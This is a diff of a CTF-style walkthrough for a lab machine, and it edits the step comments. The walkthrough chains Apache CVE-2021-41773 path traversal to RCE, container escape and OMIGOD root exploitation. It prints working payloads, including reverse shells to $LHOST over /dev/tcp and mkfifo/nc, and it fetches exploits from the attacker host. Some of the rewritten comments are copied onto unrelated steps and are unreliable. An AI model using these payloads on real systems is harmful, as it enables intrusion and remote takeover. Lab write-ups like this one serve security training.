@@ -47,8 +47,8 @@ CVE-2021-38647 (OMIGOD) ? unauth SOAP ? command exec as root on host ? root.txt
 ## 1. Reconnaissance
 
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: run an Nmap scan to discover open ports and services.
+# Why here: identify the attack surface (Apache 2.4.49) and potential entry points.
 nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oA silent
 nmap -sVC -p22,80 $TARGET -oA service
 ```
@@ -65,8 +65,8 @@ The Apache version is the entire entry point. See [nmap.md](../../tools/recon/nm
 ## 2. Web Enumeration  `.DS_Store`
 
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: descubrir endpoints ocultos que abren la siguiente fase.
+# What it does: perform directory brute-forcing with a wordlist.
+# Why here: discover hidden files or directories (.DS_Store) that provide further technical context.
 feroxbuster -u http://$TARGET -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 # 200  /assets/.DS_Store
 # 200  /assets/js/.DS_Store
@@ -79,12 +79,12 @@ Bulk-pull and parse  full chain in [ds-store-disclosure.md](../../exploits/web
 ```bash
 mkdir ds_store && cd ds_store
 for path in / /assets /assets/js /assets/images /assets/images/shape; do
-# What it does: downloads the specified URL to disk.
-# Why here: bring evidence, payloads or files needed to advance.
+# What it does: download a file from a URL.
+# Why here: transfer tools or proof of concept scripts to the target system.
   wget -x http://$TARGET${path}/.DS_Store
 done
-# What it does: extracts readable strings from a binary or file.
-# Why here: buscar credenciales, rutas o tokens embebidos.
+# What it does: extract readable strings from a binary or file.
+# Why here: search for hardcoded secrets, paths, or tokens within the binary.
 strings -e l ./assets/.DS_Store
 ```
 
@@ -98,15 +98,15 @@ Full technique: [apache-path-traversal-rce.md](../../exploits/web-rce/apache-pat
 
 Confirm arbitrary file read:
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target web server.
+# Why here: exploit the Path Traversal (CVE-2021-41773) to achieve RCE or read sensitive files.
 curl --path-as-is "http://$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
 ```
 
 Confirm RCE via POST to `/bin/sh`:
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target web server.
+# Why here: exploit the Path Traversal (CVE-2021-41773) to achieve RCE or read sensitive files.
 curl -s --path-as-is -X POST \
   "http://$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
   -d 'echo Content-Type: text/plain; echo; id'
@@ -115,13 +115,13 @@ curl -s --path-as-is -X POST \
 
 Reverse shell:
 ```bash
-# What it does: opens or uses a TCP connection/listener.
-# Why here: receive shell, transfer data or check connectivity.
+# What it does: start a TCP listener on the specified port.
+# Why here: receive the reverse shell from the vulnerable Apache or OMI service.
 nc -lvnp 4444
 ```
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target web server.
+# Why here: exploit the Path Traversal (CVE-2021-41773) to achieve RCE or read sensitive files.
 curl -s --path-as-is -X POST \
   "http://$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash" \
   -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/$LHOST/4444 0>&1'
@@ -129,8 +129,8 @@ curl -s --path-as-is -X POST \
 
 Stabilise:
 ```bash
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: execute a script or program with the specified arguments.
+# Why here: perform TTY stabilization or launch a local exploit.
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
 # Ctrl+Z
@@ -145,15 +145,15 @@ reset
 Standard [Linux enumeration](../../exploits/enumeration/linux-enumeration.md), with the container-aware checklist in [docker-container-enumeration.md](../../exploits/container/docker-container-enumeration.md).
 
 ```bash
-# What it does: muestra el hostname actual.
-# Why here: distinguir si la shell esta en host, contenedor o nodo pivote.
+# What it does: display the current system hostname.
+# Why here: confirm if the shell is running inside a container or on the host.
 hostname
 # 4a70924bafa0                  ? short Docker ID
-# What it does: lists directory contents.
-# Why here: verificar archivos, permisos o loot en la ruta actual.
+# What it does: list directory contents.
+# Why here: check for specific marker files (.dockerenv) to confirm the environment.
 ls /.dockerenv                   # exists
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: display the contents of a file.
+# Why here: read sensitive files, flags, or configuration details.
 cat /proc/self/status | grep -E '^Cap'
 # CapEff: 0000000000000000        ? stripped, no caps for the user
 cat /proc/mounts
@@ -180,8 +180,8 @@ One line, root inside the container:
 /usr/bin/python3.7 -c 'import os; os.setuid(0); import pty; pty.spawn("/bin/bash")'
 # id
 # uid=0(root) gid=1(daemon) euid=0(root) ...
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: display the contents of a file.
+# Why here: read sensitive files, flags, or configuration details.
 cat /root/user.txt
 ```
 
@@ -201,14 +201,14 @@ ifconfig
 Drop a static nmap from the attacker:
 ```bash
 # Attacker
-# What it does: changes the current directory.
-# Why here: position in the necessary path for the next command.
+# What it does: change the current working directory.
+# Why here: prepare the environment for serving static binaries or tools.
 cd ~/static-bins && sudo python3 -m http.server 80
 # https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
 
 # Inside the container
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target web server.
+# Why here: exploit the Path Traversal (CVE-2021-41773) to achieve RCE or read sensitive files.
 curl -fsSL http://$LHOST/nmap -o /tmp/nmap && chmod +x /tmp/nmap
 /tmp/nmap 172.17.0.1 -p- --min-rate 5000
 # 5986/tcp open  wsmans?       ? OMI/OMIGOD
@@ -221,11 +221,11 @@ curl -fsSL http://$LHOST/nmap -o /tmp/nmap && chmod +x /tmp/nmap
 Full technique: [omigod-rce.md](../../exploits/web-rce/omigod-rce.md).
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target web server.
+# Why here: exploit the Path Traversal (CVE-2021-41773) to achieve RCE or read sensitive files.
 curl -fsSL http://$LHOST/CVE-2021-38647.py -o /tmp/exploit.py
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: execute a script or program with the specified arguments.
+# Why here: perform TTY stabilization or launch a local exploit.
 python3 /tmp/exploit.py -t 172.17.0.1 -c 'whoami; hostname; cat /root/root.txt'
 # uid=0(root) gid=0(root) groups=0(root)
 # <root flag>
@@ -233,11 +233,11 @@ python3 /tmp/exploit.py -t 172.17.0.1 -c 'whoami; hostname; cat /root/root.txt'
 
 Reverse shell as root for persistence:
 ```bash
-# What it does: opens or uses a TCP connection/listener.
-# Why here: receive shell, transfer data or check connectivity.
+# What it does: start a TCP listener on the specified port.
+# Why here: receive the reverse shell from the vulnerable Apache or OMI service.
 nc -lvnp 4444
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: execute a script or program with the specified arguments.
+# Why here: perform TTY stabilization or launch a local exploit.
 python3 /tmp/exploit.py -t 172.17.0.1 \
   -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $LHOST 4444 >/tmp/f"
 ```
